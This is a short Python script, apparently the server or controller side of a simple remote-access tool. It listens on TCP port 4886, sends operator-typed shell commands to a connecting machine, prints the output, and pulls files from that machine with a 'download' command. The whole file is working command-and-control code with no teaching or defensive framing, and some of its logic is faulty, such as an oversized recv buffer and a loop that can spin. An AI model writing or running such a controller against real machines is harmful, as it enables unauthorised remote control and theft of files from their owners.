#admin_server.py

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_pc = ""
port = 4886

s.bind((local_pc, port))
s.listen()

while True:
    print("Listening for new connections...")
    conn, addr = s.accept()
    print("Connection OK: ", addr)
    
    while True:
        try:
            command = input("Command: ")
            if len(command) > 0 and command[:8] != "download":
                conn.sendall(command.encode())
                packet = conn.recv(4294967296)
                decoded = packet.decode()
                print(decoded)
                
            elif len(command) > 0 and command[:8] == "download":
                while True:
                    if len(command[9:]) > 0:
                        conn.sendall(command.encode())
                        packet = conn.recv(4294967296)
                        decoded = packet.decode()
                        print(decoded)
                        if decoded != "Unable to send data.":
                            f = open(command[9:], "wb")
                            f.write(packet)
                            f.close()
                        else:
                            pass
                        break
                    else:
                        print("Please input a file name!")
                
            else:
                print("Please enter a command!")

        except Exception:
            print("Disconnected from: " + str(addr))
            input()